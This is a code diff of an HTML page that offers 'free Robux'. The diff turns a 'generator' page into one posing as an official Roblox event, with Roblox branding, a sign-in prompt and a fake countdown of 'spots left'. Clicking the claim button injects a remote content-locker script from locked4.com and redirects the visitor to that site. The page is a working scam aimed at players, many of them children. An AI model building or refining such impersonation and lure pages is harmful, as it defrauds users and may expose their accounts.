@@ -1,201 +1,211 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FREE Roblox Generator | Get Robux Now</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@700;900&display=swap');
-        
-        body {
-            font-family: 'Roboto', sans-serif;
-            margin: 0;
-            padding: 0;
-            background: #0f1923;
-            color: white;
-            text-align: center;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .game-image {
-            width: 100%;
-            max-height: 400px;
-            object-fit: cover;
-            border-radius: 15px;
-            border: 4px solid #00a2ff;
-            box-shadow: 0 10px 30px rgba(0, 162, 255, 0.5);
-            margin-bottom: 20px;
-        }
-        
-        h1 {
-            color: #ff6600;
-            font-size: 2.5rem;
-            margin: 10px 0;
-            text-shadow: 2px 2px 0 #000;
-        }
-        
-        .highlight {
-            color: #00a2ff;
-            font-weight: 900;
-        }
-        
-        .cta-button {
-            display: block;
-            background: linear-gradient(to right, #ff3300, #ff6600);
-            color: white;
-            font-size: 1.8rem;
-            font-weight: bold;
-            padding: 20px;
-            margin: 30px 0;
-            border-radius: 10px;
-            text-decoration: none;
-            border: none;
-            box-shadow: 0 5px 0 #cc5200;
-            transition: all 0.2s;
-            cursor: pointer;
-        }
-        
-        .cta-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 0 #cc5200;
-        }
-        
-        .features {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin: 30px 0;
-        }
-        
-        .feature {
-            background: rgba(0, 162, 255, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-            border-left: 3px solid #ff6600;
-        }
-        
-        .countdown {
-            background: rgba(230, 0, 18, 0.3);
-            padding: 15px;
-            border-radius: 10px;
-            font-weight: bold;
-            margin: 20px 0;
-            border: 2px solid #e60012;
-        }
-        
-        .content-locker {
-            background: rgba(0,0,0,0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 30px 0;
-            display: none; /* Hidden by default */
-        }
-        
-        footer {
-            font-size: 0.8rem;
-            color: #aaa;
-            margin-top: 40px;
-        }
-        
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 1.8rem;
-            }
-            
-            .cta-button {
-                font-size: 1.4rem;
-                padding: 15px;
-            }
-            
-            .features {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Official Event - Claim Free Robux</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap');
+
+body {
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    background: #0f1923;
+    color: white;
+}
+
+/* NAVBAR */
+.navbar {
+    background: #191d21;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 30px;
+}
+.navbar .logo {
+    font-size: 1.8rem;
+    font-weight: 900;
+    color: white;
+}
+.navbar ul {
+    list-style: none;
+    display: flex;
+    gap: 20px;
+}
+.navbar ul li {
+    cursor: pointer;
+    font-weight: 500;
+}
+.navbar ul li:hover {
+    color: #00a2ff;
+}
+
+/* HERO SECTION */
+.hero {
+    background: url('images.jpg') center/cover no-repeat;
+    height: 350px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    text-align: center;
+    box-shadow: inset 0 0 0 2000px rgba(0,0,0,0.4);
+}
+.hero h1 {
+    font-size: 2.5rem;
+    font-weight: 900;
+    margin: 0;
+}
+.hero p {
+    font-size: 1.2rem;
+    color: #ddd;
+}
+.claim-btn {
+    background: linear-gradient(90deg, #ff0000, #ff6600);
+    color: white;
+    padding: 15px 30px;
+    font-size: 1.5rem;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 15px;
+    box-shadow: 0 0 15px rgba(255,102,0,0.7);
+    transition: 0.3s;
+}
+.claim-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 0 25px rgba(255,102,0,1);
+}
+
+/* COUNTDOWN */
+.countdown {
+    background: rgba(255,255,255,0.05);
+    padding: 15px;
+    margin: 20px auto;
+    max-width: 500px;
+    border-radius: 10px;
+    text-align: center;
+    font-weight: bold;
+}
+
+/* FEATURES */
+.features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit,minmax(200px,1fr));
+    gap: 15px;
+    padding: 20px;
+}
+.feature {
+    background: rgba(255,255,255,0.05);
+    padding: 15px;
+    border-radius: 10px;
+    text-align: center;
+    transition: 0.3s;
+}
+.feature:hover {
+    background: rgba(255,255,255,0.1);
+    transform: scale(1.05);
+}
+
+/* CONTENT LOCKER */
+#contentLocker {
+    background: rgba(0,0,0,0.8);
+    padding: 20px;
+    border-radius: 10px;
+    display: none;
+    margin: 20px auto;
+    max-width: 500px;
+    text-align: center;
+}
+
+/* FOOTER */
+footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 0.8rem;
+    color: #888;
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.techlearning.com/how-to/what-is-roblox-and-how-can-it-be-used-to-teach-tips-and-tricks" alt="Roblox Game" class="game-image">
-        
-        <h1>GET <span class="highlight">FREE ROBUX</span> NOW!</h1>
-        <p>Unlock 10,000 Robux + Exclusive Items Instantly</p>
-        
-        <div class="countdown">
-            ⏳ LIMITED TIME: Only <span id="spots">12</span> spots left!
-        </div>
-        
-        <button id="downloadBtn" class="cta-button">DOWNLOAD GENERATOR</button>
-        
-        <div class="features">
-            <div class="feature">
-                💰 10,000 Free Robux
-            </div>
-            <div class="feature">
-                👕 Rare Avatar Items
-            </div>
-            <div class="feature">
-                🎮 Unlock All Games
-            </div>
-            <div class="feature">
-                🔥 VIP Game Passes
-            </div>
-        </div>
-        
-        <div id="contentLocker" class="content-locker">
-            <h2>Complete Verification To Continue</h2>
-            <!-- Content Locker Script Will Load Here -->
-        </div>
-        
-        <footer>
-            Not affiliated with Roblox Corporation. Use at your own risk.
-        </footer>
-    </div>
-    
-    <script>
-        // Simple countdown
-        let spots = 12;
-        setInterval(() => {
-            spots--;
-            if (spots < 0) spots = 0;
-            document.getElementById('spots').textContent = spots;
-        }, 60000);
 
-        // Show content locker when button is clicked
-        document.getElementById('downloadBtn').addEventListener('click', function() {
-            // Show the content locker div
-            const locker = document.getElementById('contentLocker');
-            locker.style.display = 'block';
-            
-            // Scroll to the content locker
-            locker.scrollIntoView({ behavior: 'smooth' });
-            
-            // Create and load the content locker scripts
-            const script1 = document.createElement('script');
-            script1.type = 'text/javascript';
-            script1.text = 'var ogblock=true;';
-            document.head.appendChild(script1);
-            
-            const script2 = document.createElement('script');
-            script2.type = 'text/javascript';
-            script2.id = 'ogjs';
-            script2.src = 'https://locked4.com/cl/js/6d6l68';
-            document.head.appendChild(script2);
-            
-            const script3 = document.createElement('script');
-            script3.type = 'text/javascript';
-            script3.text = 'if(ogblock) window.location.href = "https://locked4.com/adblock";';
-            document.head.appendChild(script3);
-            
-            // Redirect to locker page after a short delay to allow scripts to load
-            setTimeout(() => {
-                window.location.href = "https://locked4.com/cl/i/6d6l68";
-            }, 500);
-        });
-    </script>
+<!-- NAVIGATION -->
+<div class="navbar">
+    <div class="logo">ROBLOX</div>
+    <ul>
+        <li>Home</li>
+        <li>Games</li>
+        <li>Avatar Shop</li>
+        <li>Premium</li>
+        <li>Events</li>
+    </ul>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+    <h1>Roblox Official Event</h1>
+    <p>Claim up to 10,000 Robux & exclusive avatar items</p>
+    <button id="downloadBtn" class="claim-btn">Claim Robux</button>
+</div>
+
+<!-- COUNTDOWN -->
+<div class="countdown">
+    ⏳ LIMITED TIME: Only <span id="spots">12</span> spots left!
+</div>
+
+<!-- FEATURES -->
+<div class="features">
+    <div class="feature">💰 Get up to 10,000 Robux</div>
+    <div class="feature">👕 Exclusive Avatar Items</div>
+    <div class="feature">🎮 Premium Game Access</div>
+    <div class="feature">🔥 Limited Event Rewards</div>
+</div>
+
+<!-- CONTENT LOCKER -->
+<div id="contentLocker">
+    <h2>Sign in to Claim Your Reward</h2>
+    <!-- Content Locker Script -->
+</div>
+
+<!-- FOOTER -->
+<footer>
+    Not affiliated with Roblox Corporation. This is a promotional event.
+</footer>
+
+<script>
+let spots = 12;
+setInterval(() => {
+    spots--;
+    if (spots < 0) spots = 0;
+    document.getElementById('spots').textContent = spots;
+}, 60000);
+
+document.getElementById('downloadBtn').addEventListener('click', function() {
+    const locker = document.getElementById('contentLocker');
+    locker.style.display = 'block';
+    locker.scrollIntoView({ behavior: 'smooth' });
+
+    const script1 = document.createElement('script');
+    script1.type = 'text/javascript';
+    script1.text = 'var ogblock=true;';
+    document.head.appendChild(script1);
+
+    const script2 = document.createElement('script');
+    script2.type = 'text/javascript';
+    script2.id = 'ogjs';
+    script2.src = 'https://locked4.com/cl/js/6d6l68';
+    document.head.appendChild(script2);
+
+    const script3 = document.createElement('script');
+    script3.type = 'text/javascript';
+    script3.text = 'if(ogblock) window.location.href = "https://locked4.com/adblock";';
+    document.head.appendChild(script3);
+
+    setTimeout(() => {
+        window.location.href = "https://locked4.com/cl/i/6d6l68";
+    }, 500);
+});
+</script>
+
 </body>
 </html>
